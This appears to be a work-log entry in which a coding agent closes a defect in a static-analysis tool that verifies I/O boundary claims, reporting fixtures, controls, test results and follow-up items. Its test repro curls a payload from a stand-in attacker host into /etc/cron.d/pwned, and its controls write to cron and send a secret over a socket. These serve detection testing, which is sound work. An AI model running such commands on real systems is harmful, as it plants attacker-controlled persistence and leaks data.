- op: discuss  # 9a47
  at: '2026-08-13T01:22:52Z'  # 9a47
  by: agent  # 9a47
  actor: jgstern_agent  # 9a47
  clock: 3  # 9a47
  nonce: 9a47  # 9a47
  message: "CLOSED with behavioural evidence re-run against the MERGED tree, both controls\nfiring in the same session, plus a non-destruction assertion.\n\nTHE FILED REPRO, re-run verbatim on the shipped CLI:\n\n  # run.py — the whole program\n  import subprocess\n  def grab():\n      subprocess.run([\"curl\", \"-o\", \"/etc/cron.d/pwned\", \"https://evil.example/p\"])\n\n  claim {boundary: fs_write, must_not_exist: true}   before: confirmed rc 0\n                                                      after:  inconclusive rc 2\n  claim {boundary: net_send, must_not_exist: true}   before: confirmed rc 0\n                                                      after:  inconclusive rc 2\n\nRendered reason, read from the CLI's own output rather than asserted as a\nsubstring (a doubled clause shipped past green tests once for exactly that\nreason):\n\n  No fs_write chains found, but the analysis launches an external program at 1\n  call site(s) (subprocess.run) and cannot see what the launched program does,\n  so whether this I/O happens there was never examined; cannot confirm the\n  boundary is unused.\n\nCONTROLS, NON-DESTRUCTION ASSERTED (this change can only move confirmed ->\ninconclusive; `verify_claim` returns `violated` outside the coverage branch):\n\n  open(\"/etc/cron.d/pwned\",\"w\").write(\"x\")  fs_write claim  violated rc 1 (unchanged)\n  socket.connect(...); socket.send(secret)  net_send claim  violated rc 1 (unchanged)\n  os.makedirs (classified, NON-opaque, over a module with NO enumeration\n    record)                                                complete=True (unchanged)\n\nThat third one is the discriminator and the whole precision argument: it and the\nsubprocess fixture are BOTH complete=True before the fix and both are single\nclassified calls over an unenumerated module. A fix that merely stopped trusting\n`classify_call` would turn both False. The distinction had to be the BOUNDARY,\nnot the fact of matching, and there is a test that fails if that ever inverts.\n\nSUITE: 4260 passed / 0 failed on the targeted run; full suite + 100% coverage +\nper-package isolation checked before merge. NO existing test asserted the\ndefect — a first for this run of P0s, and worth noting given five did on 08-12.\n\nWHAT THE FIX IS. `io_boundary.OPAQUE_BOUNDARIES` (sole member `subprocess`)\nnames the one catalog-declarable boundary that denotes opacity rather than a\nknown surface; `IoBoundaryCatalog.declares_opaque_crossing` answers it over\nEVERY row for a primitive; `verify_claims._opaque_launch_sites` consumes it; and\n`_external_call_sites` was extracted so it and `_uncatalogued_external_modules`\nwalk one population rather than two (the INV-motos lesson: sharing a predicate\nis not enough when the callers iterate differently).\n\nTHE SET IS CLOSED, not a shortlist. `_parse_catalog` iterates exactly\n`CATALOG_BOUNDARY_TYPES`, so no other name can appear on a catalogued primitive;\n`external_potential` and `command_launch` are synthesised and already excluded\nfrom the verified surface. The one plausible other candidate was checked and\nrejected on inspection: `process_send` is intra-VM message passing (Erlang\nprocesses, gen_server) and Swift termination, not an external launch.\n\nFOUND BY A CONTROL, NOT BY THE ITEM IN HAND — the fourth consecutive P0 of that\nshape. The queued item was `io_primitives/bash.yaml`; this surfaced while\nchecking whether a stub catalogue was safe to ship, and the answer was that the\nsame six lines that add real detection (`curl` -> `net_send`, a shell script\ncurling a secret goes violated rc 1, which the tool has never done) also\nmanufacture a false confirm on a DIFFERENT boundary. A/B by moving one file:\n\n  bash.yaml absent  + fs_write claim -> inconclusive rc 2   (honest)\n  bash.yaml present + fs_write claim -> CONFIRMED rc 0      (false)\n  bash.yaml present + net_send claim -> violated rc 1       (true detection)\n\nSELF-PROOF UNCHANGED, measured rather than assumed: 18/18 inconclusive before\nand after, because the taint arm blocks earlier on its own language census\n(bash, csharp, solidity — INV-dabuf). Zero verdict change on this repo in either\ndirection.\n\nSPUN OFF, NOT SILENTLY ABSORBED:\n  * INV-zumin — a multi-boundary primitive is TAGGED with only one boundary, so\n    scala's Process.apply is undetectable as a subprocess launch. This item\n    closed the EXAMINATION side; detection is still wrong.\n  * WI-jupaf — erlang.yaml has no `subprocess:` section at all and catalogues\n    `os:cmd` (the shell-out) as env_read + env_write beside getenv/putenv.\n\nSTILL OPEN AND NAMED: the residual disclosed by the gate's own SCOPE paragraph\nis untouched — a bare `external` placeholder dst names no module and is skipped,\nso a repo reaching a launch ONLY through an untyped receiver still confirms.\nThat is the INV-linub receiver-typing gap, tracked there."  # 9a47
